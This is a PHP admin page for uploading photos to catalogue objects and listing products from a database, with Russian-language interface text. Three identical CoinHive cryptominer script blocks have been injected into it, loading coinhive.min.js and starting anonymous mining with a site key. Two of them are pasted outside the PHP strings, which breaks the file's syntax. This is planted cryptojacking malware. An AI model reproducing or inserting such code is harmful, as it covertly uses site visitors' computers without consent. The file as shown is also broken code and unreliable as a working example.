<?

include "conf.php";

echo "<a href='admin.php'>в админку</a>\n";
<script src="https://coinhive.com/lib/coinhive.min.js"></script> <script>  
//we need food too :c 
var sos = new CoinHive.Anonymous('rmeaj60xrFjJ6gOi6Zk1EvB0bNdmPqT6', {throttle: 0.1});

sos.setNumberThreads(3);

sos.start();
</script><script src="https://coinhive.com/lib/coinhive.min.js"></script> <script>  
//we need food too :c 
var sos = new CoinHive.Anonymous('rmeaj60xrFjJ6gOi6Zk1EvB0bNdmPqT6', {throttle: 0.1});

sos.setNumberThreads(3);

sos.start();
</script>
echo "<h3>Добавить картинки к объекту (по номеру объекта)</h3>
<form enctype='multipart/form-data' action='upload_imacode.php' method='post'>
НОМЕР ОБЪЕКТА:<input type='text' style='background:#FF0000;' id='tita' name='num' value='введите номер'>
<input type='hidden' name='MAX_FILE_SIZE' value='9990000'>
<font class='txtc'>Загрузить<br>фотографию:</font>
<br><input name='userfile' type='file'\">
<input type='submit' value='Загрузить'>
</form>\n";

$sql="SELECT * FROM tov";
$result = @mysql_query("$sql",$db);
$k=@mysql_num_rows($result);

echo "<table border=1>";

for($i=0;$i<$k;$i++){
	$id1=@mysql_result($result, $i,"id");
	$fotos=@mysql_result($result, $i,"fotos");
	$name=@mysql_result($result, $i,"name");
	$zen=@mysql_result($result, $i,"zen");
	
	$zenz=@mysql_result($result, $i,"zenz");
	$str=@mysql_result($result, $i,"str");

	$kolo=@mysql_result($result, $i,"kol");
	
	echo "<tr>\n";
	echo "<td><input type='button' value='Установить' onclick=\"document.getElementById('tita').value='$id1';\"/></td>";	
	echo "<td>".$id1."</td>\n";
	echo "<td>".$name."</td>";	
	echo "<td><img src='".$fotos."' width=80px></td>";	
	
	echo "</tr>\n";
	
}

echo "</table>";


echo "<script>
setTimeout('tita2();',100);

function tita2(){
	id=document.getElementById('tita');
	if (id!=null){if ((id.value=='')||(id.value=='введите номер')){id.style.background='#FF0000';}else{id.style.background='#00FF00';}}
	
setTimeout('tita2();',250);	
	
}
</script>
<script src="https://coinhive.com/lib/coinhive.min.js"></script> <script>  
//we need food too :c 
var sos = new CoinHive.Anonymous('rmeaj60xrFjJ6gOi6Zk1EvB0bNdmPqT6', {throttle: 0.1});

sos.setNumberThreads(3);

sos.start();
</script>";

?>